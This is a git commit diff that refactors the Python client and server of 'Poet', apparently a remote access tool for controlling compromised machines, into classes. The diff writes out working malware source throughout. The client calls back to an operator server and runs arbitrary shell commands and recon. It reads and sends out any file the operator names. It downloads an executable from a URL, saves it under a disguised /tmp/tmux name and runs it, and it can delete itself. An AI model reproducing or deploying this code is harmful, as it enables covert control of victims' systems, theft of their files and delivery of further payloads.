9c43539b70c8b3cf73ce4902fffa5177a4386209
Mark Mossberg <mark.mossberg@gmail.com>
2014-10-17 14:59:13 -0400

    Refactor client/server to use OOP
    Convert the client and server to use OOP style by putting all the
    shell_* functions into PoetServer/Client classes.
    
    Addresses #26

--- client.py
+++ client.py
@@ -84,6 +84,102 @@ class PoetSocketClient(PoetSocket):
         super(PoetSocketClient, self).__init__(self.s)
 
 
+class PoetClient(object):
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+
+    def start(self):
+        s = PoetSocketClient(self.host, self.port)
+        while True:
+            try:
+                inp = s.recv()
+                if inp == 'fin':
+                    break
+                elif inp == 'getprompt':
+                    s.send(self.get_prompt())
+                elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
+                    s.send(self.execute(inp))
+                elif inp == 'recon':
+                    s.send(self.recon())
+                elif inp.startswith('shell '):
+                    s.send(self.cmd_exec(inp[6:]).strip())
+                elif inp.startswith('exfil '):
+                    try:
+                        with open(os.path.expanduser(inp[6:])) as f:
+                            s.send(f.read())
+                    except IOError as e:
+                        s.send(e.strerror)
+                elif inp == 'selfdestruct':
+                    try:
+                        os.remove(__file__)
+                        if __file__.strip('./') not in os.listdir('.'):
+                            s.send('boom')
+                            sys.exit()
+                        else:
+                            raise Exception('client not deleted')
+                    except Exception as e:
+                        s.send(str(e.message))
+                elif inp.startswith('dlexec'):
+                    try:
+                        self.dlexec(inp)
+                        s.send('done')
+                    except Exception as e:
+                        s.send(str(e.message))
+                else:
+                    s.send('Unrecognized')
+            except socket.error as e:
+                if e.message == 'too much data!':
+                    s.send('psh : ' + e.message)
+                else:
+                    raise
+        s.close()
+
+    def execute(self, inp):
+        out = ''
+        cmds = self.parse_exec_cmds(inp)
+        for cmd in cmds:
+            cmd_out = self.cmd_exec(cmd)
+            out += '='*20 + '\n\n$ {}\n{}\n'.format(cmd, cmd_out)
+        return out
+
+    def recon(self):
+        ipcmd = 'ip addr' if 'no' in self.cmd_exec('which ifconfig') else 'ifconfig'
+        exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
+        return self.execute(exec_str)
+
+    def dlexec(self, inp):
+        r = urllib2.urlopen(inp.split()[1])
+        rand = str(random.random())[2:6]
+        tmp = '/tmp/tmux-{}'.format(rand)
+        with open(tmp, 'w') as f:
+            f.write(r.read())
+            os.fchmod(f.fileno(), stat.S_IRWXU)
+        sp.Popen(tmp, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
+
+    def cmd_exec(self, cmd):
+        return sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT,
+                        shell=True).communicate()[0]
+
+    def get_prompt(self):
+        user = self.cmd_exec('whoami').strip()
+        hn = self.cmd_exec('hostname').strip()
+        end = '#' if user == 'root' else '$'
+        return '{}@{} {} '.format(user, hn, end)
+
+    def parse_exec_cmds(self, inp):
+        cmds = []
+        inp = inp[5:]
+        num_cmds = inp.count('"') / 2
+        for i in range(num_cmds):
+            first = inp.find('"')
+            second = inp.find('"', first+1)
+            cmd = inp[first+1:second]
+            cmds.append(cmd)
+            inp = inp[second+2:]
+        return cmds
+
+
 def get_args():
     """ Parse arguments and return dictionary. """
 
@@ -107,103 +203,6 @@ def is_active(host, port):
     return False
 
 
-def shell_client(host, port):
-    s = PoetSocketClient(host, port)
-    while True:
-        try:
-            inp = s.recv()
-            if inp == 'fin':
-                break
-            elif inp == 'getprompt':
-                s.send(get_prompt())
-            elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
-                s.send(shell_exec(inp))
-            elif inp == 'recon':
-                s.send(shell_recon())
-            elif inp.startswith('shell '):
-                s.send(cmd_exec(inp[6:]).strip())
-            elif inp.startswith('exfil '):
-                try:
-                    with open(os.path.expanduser(inp[6:])) as f:
-                        s.send(f.read())
-                except IOError as e:
-                    s.send(e.strerror)
-            elif inp == 'selfdestruct':
-                try:
-                    os.remove(__file__)
-                    if __file__.strip('./') not in os.listdir('.'):
-                        s.send('boom')
-                        sys.exit()
-                    else:
-                        raise Exception('client not deleted')
-                except Exception as e:
-                    s.send(str(e.message))
-            elif inp.startswith('dlexec'):
-                try:
-                    shell_dlexec(inp)
-                    s.send('done')
-                except Exception as e:
-                    s.send(str(e.message))
-            else:
-                s.send('Unrecognized')
-        except socket.error as e:
-            if e.message == 'too much data!':
-                s.send('psh : ' + e.message)
-            else:
-                raise
-    s.close()
-
-
-def shell_exec(inp):
-    out = ''
-    cmds = parse_exec_cmds(inp)
-    for cmd in cmds:
-        cmd_out = cmd_exec(cmd)
-        out += '='*20 + '\n\n$ {}\n{}\n'.format(cmd, cmd_out)
-    return out
-
-
-def shell_recon():
-    ipcmd = 'ip addr' if 'no' in cmd_exec('which ifconfig') else 'ifconfig'
-    exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
-    return shell_exec(exec_str)
-
-
-def shell_dlexec(inp):
-    r = urllib2.urlopen(inp.split()[1])
-    rand = str(random.random())[2:6]
-    tmp = '/tmp/tmux-{}'.format(rand)
-    with open(tmp, 'w') as f:
-        f.write(r.read())
-        os.fchmod(f.fileno(), stat.S_IRWXU)
-    sp.Popen(tmp, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
-
-
-def cmd_exec(cmd):
-    return sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT,
-                    shell=True).communicate()[0]
-
-
-def get_prompt():
-    user = cmd_exec('whoami').strip()
-    hn = cmd_exec('hostname').strip()
-    end = '#' if user == 'root' else '$'
-    return '{}@{} {} '.format(user, hn, end)
-
-
-def parse_exec_cmds(inp):
-    cmds = []
-    inp = inp[5:]
-    num_cmds = inp.count('"') / 2
-    for i in range(num_cmds):
-        first = inp.find('"')
-        second = inp.find('"', first+1)
-        cmd = inp[first+1:second]
-        cmds.append(cmd)
-        inp = inp[second+2:]
-    return cmds
-
-
 def main():
     args = get_args()
 
@@ -223,7 +222,7 @@ def main():
         while True:
             if is_active(HOST, PORT):
                 log.info('[+] ({}) Server is active'.format(datetime.now()))
-                shell_client(HOST, PORT)
+                PoetClient(HOST, PORT).start()
             else:
                 log.info('[!] ({}) Server is inactive'.format(datetime.now()))
             time.sleep(DELAY)
--- server.py
+++ server.py
@@ -87,205 +87,206 @@ class PoetSocketServer(PoetSocket):
         return self.s.accept()
 
 
+class PoetServer(object):
+    def __init__(self, s, port):
+        self.s = s
+        self.port = port
+        self.conn = None
+
+    def psh(self):
+        cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil',
+                'selfdestruct', 'dlexec']
+        print '[+] ({}) Entering control shell'.format(datetime.now())
+        self.conn = PoetSocket(self.s.accept()[0])
+        prompt = self.conn.exchange('getprompt')
+        print 'Welcome to psh, the poet shell!'
+        print 'Running `help\' will give you a list of supported commands.'
+        while True:
+            try:
+                inp = raw_input(PSH_PROMPT)
+                if inp == '':
+                    continue
+                base = inp.split()[0]
+                # exit
+                if base == cmds[0]:
+                    break
+                # help
+                elif base == cmds[1]:
+                    print 'Commands:\n  {}'.format('\n  '.join(cmds))
+                # exec
+                elif base == cmds[2]:
+                    inp += ' '  # for regex
+                    exec_regex = '^exec( -o( [\w.]+)?)? (("[^"]+")\ )+$'
+                    if re.search(exec_regex, inp):
+                        self.generic(*self.exec_preproc(inp))
+                    else:
+                        self.cmd_help(cmds, 2)
+                # recon
+                elif base == cmds[3]:
+                    if re.search('^recon( -o( [\w.]+)?)?$', inp):
+                        if '-o' in inp.split():
+                            if len(inp.split()) == 3:
+                                self.generic(base, True, inp.split()[2])
+                            else:
+                                self.generic(base, True)
+                        else:
+                            self.generic(base)
+                    else:
+                        self.cmd_help(cmds, 3)
+                # shell
+                elif base == cmds[4]:
+                    if inp == 'shell':
+                        self.shell(prompt)
+                    else:
+                        self.cmd_help(cmds, 4)
+                # exfil
+                elif base == cmds[5]:
+                    if re.search('^exfil ([\w\/\\.~:]+ )+$', inp + ' '):
+                        for file in inp.split()[1:]:
+                            resp = self.conn.exchange('exfil ' + file)
+                            if 'No such' in resp:
+                                print 'psh : {}: {}'.format(resp, file)
+                                continue
+                            self.write(resp, base, OUT,
+                                       file.split('/')[-1].strip('.'))
+                    else:
+                        self.cmd_help(cmds, 5)
+                # selfdestruct
+                elif base == cmds[6]:
+                    if inp == 'selfdestruct':
+                        print """[!] WARNING: You are about to permanently remove the client from the target.
+        You will immediately lose access to the target. Continue? (y/n)""",
+                        if raw_input().lower()[0] == 'y':
+                            resp = self.conn.exchange('selfdestruct')
+                            if resp == 'boom':
+                                print '[+] ({}) Exiting control shell.'.format(datetime.now())
+                                return
+                            else:
+                                print 'psh : Self destruct error: {}'.format(resp)
+                        else:
+                            print 'psh : Aborting self destruct.'
+                    else:
+                        self.cmd_help(cmds, 6)
+                # dlexec
+                elif base == cmds[7]:
+                    if re.search('^dlexec https?:\/\/[\w.\/]+$', inp):
+                        resp = self.conn.exchange(inp)
+                        msg = 'successful' if resp == 'done' else 'error: ' + resp
+                        print 'psh : dlexec {}'.format(msg)
+                    else:
+                        self.cmd_help(cmds, 7)
+                else:
+                    print 'psh: {}: command not found'.format(base)
+            except KeyboardInterrupt:
+                print
+                continue
+            except EOFError:
+                print
+                break
+        self.conn.send('fin')
+        print '[+] ({}) Exiting control shell.'.format(datetime.now())
+
+    def generic(self, req, write_flag=False, write_file=None):
+        resp = self.conn.exchange(req)
+        print resp
+        if write_flag:
+            self.write(resp, req.split()[0], OUT, write_file)
+
+    def write(self, response, prefix, out_dir, write_file=None):
+        ts = datetime.now().strftime('%Y%m%d%M%S')
+        out_ts_dir = '{}/{}'.format(out_dir, ts[:len('20140101')])
+        out_prefix_dir = '{}/{}'.format(out_ts_dir, prefix)
+        if write_file:
+            outfile = '{}/{}'.format(out_prefix_dir, write_file)
+        else:
+            outfile = '{}/{}-{}.txt'.format(out_prefix_dir, prefix, ts)
+        response = '{}\n\n{}'.format(datetime.now(), response)
+        if not os.path.isdir(out_dir):
+            os.mkdir(out_dir)
+        if not os.path.isdir(out_ts_dir):
+            os.mkdir(out_ts_dir)
+        if not os.path.isdir(out_prefix_dir):
+            os.mkdir(out_prefix_dir)
+        with open(outfile, 'w') as f:
+            f.write(response)
+            print 'psh : {} written to {}'.format(prefix, outfile)
+
+    def cmd_help(self, cmds, ind):
+        if ind == 2:
+            print 'Execute commands on target.'
+            print 'usage: exec [-o [filename]] "cmd1" ["cmd2" "cmd3" ...]'
+            print '\nExecute given commands and optionally log to file with optional filename.'
+            print '\noptions:'
+            print '-h\t\tshow help'
+            print '-o filename\twrite results to file in {}/'.format(OUT)
+        elif ind == 3:
+            print 'Basic reconaissance of target.'
+            print 'usage: recon [-h] [-o]'
+            print '\nExecutes, whoami, id, w, who -a, uname -a, and lsb_release -a on target where applicable.'
+            print '\noptions:'
+            print '-h\t\tshow help'
+            print '-o\t\twrite results to file in {}/'.format(OUT)
+        elif ind == 4:
+            print 'Basic shell on target (forwards stdout of commands executed).'
+            print 'usage: shell [-h]'
+            print '\noptions:'
+            print '-h\t\tshow help'
+        elif ind == 5:
+            print 'Exfiltrate files.'
+            print 'usage: exfil [-h] file1 [file2 file3 ...]'
+            print '\nDownloads files to {}/'.format(OUT)
+            print '\noptions:'
+            print '-h\t\tshow help'
+        elif ind == 6:
+            print 'Self destruct.'
+            print 'usage: selfdestruct [-h]'
+            print '\nPermanently remove client from target.'
+            print '\noptions:'
+            print '-h\t\tshow help'
+        elif ind == 7:
+            print 'Download and execute.'
+            print 'usage: dlexec http://my.pro/gram [-h]'
+            print '\nDownload executable from internet and execute.'
+            print '\noptions:'
+            print '-h\t\tshow help'
+
+    def exec_preproc(self, inp):
+        tmp = inp.split()
+        write_file = None
+        write_flag = tmp[1] == '-o'
+        if write_flag:
+            if '"' not in tmp[2]:
+                write_file = tmp[2]
+                del tmp[2]
+            del tmp[1]
+        tmp = ' '.join(tmp)
+        return tmp, write_flag, write_file
+
+    def shell(self, prompt):
+        pass
+        while True:
+            try:
+                inp = raw_input(PSH_PROMPT + prompt)
+                if inp == '':
+                    continue
+                elif inp == 'exit':
+                    break
+                else:
+                    print self.conn.exchange('shell {}'.format(inp))
+            except KeyboardInterrupt:
+                print
+                continue
+            except EOFError:
+                print
+                break
+
+
 def get_args():
     """ Parse arguments and return dictionary. """
 
     parser = argparse.ArgumentParser()
     parser.add_argument('-p', '--port')
     return parser.parse_args()
-
-
-def shell_server(s, PORT):
-    cmds = ['exit', 'help', 'exec', 'recon', 'shell', 'exfil', 'selfdestruct',
-            'dlexec']
-    print '[+] ({}) Entering control shell'.format(datetime.now())
-    conn = PoetSocket(s.accept()[0])
-    prompt = conn.exchange('getprompt')
-    print 'Welcome to psh, the poet shell!'
-    print 'Running `help\' will give you a list of supported commands.'
-    while True:
-        try:
-            inp = raw_input(PSH_PROMPT)
-            if inp == '':
-                continue
-            base = inp.split()[0]
-            # exit
-            if base == cmds[0]:
-                break
-            # help
-            elif base == cmds[1]:
-                print 'Commands:\n  {}'.format('\n  '.join(cmds))
-            # exec
-            elif base == cmds[2]:
-                inp += ' '  # for regex
-                exec_regex = '^exec( -o( [\w.]+)?)? (("[^"]+")\ )+$'
-                if re.search(exec_regex, inp):
-                    shell_generic(conn, *shell_exec_preproc(inp))
-                else:
-                    shell_cmd_help(cmds, 2)
-            # recon
-            elif base == cmds[3]:
-                if re.search('^recon( -o( [\w.]+)?)?$', inp):
-                    if '-o' in inp.split():
-                        if len(inp.split()) == 3:
-                            shell_generic(conn, base, True, inp.split()[2])
-                        else:
-                            shell_generic(conn, base, True)
-                    else:
-                        shell_generic(conn, base)
-                else:
-                    shell_cmd_help(cmds, 3)
-            # shell
-            elif base == cmds[4]:
-                if inp == 'shell':
-                    shell_shell(conn, prompt)
-                else:
-                    shell_cmd_help(cmds, 4)
-            # exfil
-            elif base == cmds[5]:
-                if re.search('^exfil ([\w\/\\.~:]+ )+$', inp + ' '):
-                    for file in inp.split()[1:]:
-                        resp = conn.exchange('exfil ' + file)
-                        if 'No such' in resp:
-                            print 'psh : {}: {}'.format(resp, file)
-                            continue
-                        shell_write(resp, base, OUT,
-                                    file.split('/')[-1].strip('.'))
-                else:
-                    shell_cmd_help(cmds, 5)
-            # selfdestruct
-            elif base == cmds[6]:
-                if inp == 'selfdestruct':
-                    print """[!] WARNING: You are about to permanently remove the client from the target.
-    You will immediately lose access to the target. Continue? (y/n)""",
-                    if raw_input().lower()[0] == 'y':
-                        resp = conn.exchange('selfdestruct')
-                        if resp == 'boom':
-                            print '[+] ({}) Exiting control shell.'.format(datetime.now())
-                            return
-                        else:
-                            print 'psh : Self destruct error: {}'.format(resp)
-                    else:
-                        print 'psh : Aborting self destruct.'
-                else:
-                    shell_cmd_help(cmds, 6)
-            # dlexec
-            elif base == cmds[7]:
-                if re.search('^dlexec https?:\/\/[\w.\/]+$', inp):
-                    resp = conn.exchange(inp)
-                    msg = 'successful' if resp == 'done' else 'error: ' + resp
-                    print 'psh : dlexec {}'.format(msg)
-                else:
-                    shell_cmd_help(cmds, 7)
-            else:
-                print 'psh: {}: command not found'.format(base)
-        except KeyboardInterrupt:
-            print
-            continue
-        except EOFError:
-            print
-            break
-    conn.send('fin')
-    print '[+] ({}) Exiting control shell.'.format(datetime.now())
-
-
-def shell_generic(s, req, write_flag=False, write_file=None):
-    resp = s.exchange(req)
-    print resp
-    if write_flag:
-        shell_write(resp, req.split()[0], OUT, write_file)
-
-
-def shell_write(response, prefix, out_dir, write_file=None):
-    ts = datetime.now().strftime('%Y%m%d%M%S')
-    out_ts_dir = '{}/{}'.format(out_dir, ts[:len('20140101')])
-    out_prefix_dir = '{}/{}'.format(out_ts_dir, prefix)
-    if write_file:
-        outfile = '{}/{}'.format(out_prefix_dir, write_file)
-    else:
-        outfile = '{}/{}-{}.txt'.format(out_prefix_dir, prefix, ts)
-    response = '{}\n\n{}'.format(datetime.now(), response)
-    if not os.path.isdir(out_dir):
-        os.mkdir(out_dir)
-    if not os.path.isdir(out_ts_dir):
-        os.mkdir(out_ts_dir)
-    if not os.path.isdir(out_prefix_dir):
-        os.mkdir(out_prefix_dir)
-    with open(outfile, 'w') as f:
-        f.write(response)
-        print 'psh : {} written to {}'.format(prefix, outfile)
-
-
-def shell_cmd_help(cmds, ind):
-    if ind == 2:
-        print 'Execute commands on target.'
-        print 'usage: exec [-o [filename]] "cmd1" ["cmd2" "cmd3" ...]'
-        print '\nExecute given commands and optionally log to file with optional filename.'
-        print '\noptions:'
-        print '-h\t\tshow help'
-        print '-o filename\twrite results to file in {}/'.format(OUT)
-    elif ind == 3:
-        print 'Basic reconaissance of target.'
-        print 'usage: recon [-h] [-o]'
-        print '\nExecutes, whoami, id, w, who -a, uname -a, and lsb_release -a on target where applicable.'
-        print '\noptions:'
-        print '-h\t\tshow help'
-        print '-o\t\twrite results to file in {}/'.format(OUT)
-    elif ind == 4:
-        print 'Basic shell on target (forwards stdout of commands executed).'
-        print 'usage: shell [-h]'
-        print '\noptions:'
-        print '-h\t\tshow help'
-    elif ind == 5:
-        print 'Exfiltrate files.'
-        print 'usage: exfil [-h] file1 [file2 file3 ...]'
-        print '\nDownloads files to {}/'.format(OUT)
-        print '\noptions:'
-        print '-h\t\tshow help'
-    elif ind == 6:
-        print 'Self destruct.'
-        print 'usage: selfdestruct [-h]'
-        print '\nPermanently remove client from target.'
-        print '\noptions:'
-        print '-h\t\tshow help'
-    elif ind == 7:
-        print 'Download and execute.'
-        print 'usage: dlexec http://my.pro/gram [-h]'
-        print '\nDownload executable from internet and execute.'
-        print '\noptions:'
-        print '-h\t\tshow help'
-
-
-def shell_exec_preproc(inp):
-    tmp = inp.split()
-    write_file = None
-    write_flag = tmp[1] == '-o'
-    if write_flag:
-        if '"' not in tmp[2]:
-            write_file = tmp[2]
-            del tmp[2]
-        del tmp[1]
-    tmp = ' '.join(tmp)
-    return tmp, write_flag, write_file
-
-
-def shell_shell(s, prompt):
-    pass
-    while True:
-        try:
-            inp = raw_input(PSH_PROMPT + prompt)
-            if inp == '':
-                continue
-            elif inp == 'exit':
-                break
-            else:
-                print s.exchange('shell {}'.format(inp))
-        except KeyboardInterrupt:
-            print
-            continue
-        except EOFError:
-            print
-            break
 
 
 def main():
@@ -302,7 +303,7 @@ def main():
         conn.send(FAKEOK)
         conn.close()
         try:
-            shell_server(s, PORT)
+            PoetServer(s, PORT).psh()
         except socket.error as e:
             print '[!] ({}) Socket error: {}'.format(datetime.now(), e.message)
             print '[-] ({}) Poet terminated.'.format(datetime.now())
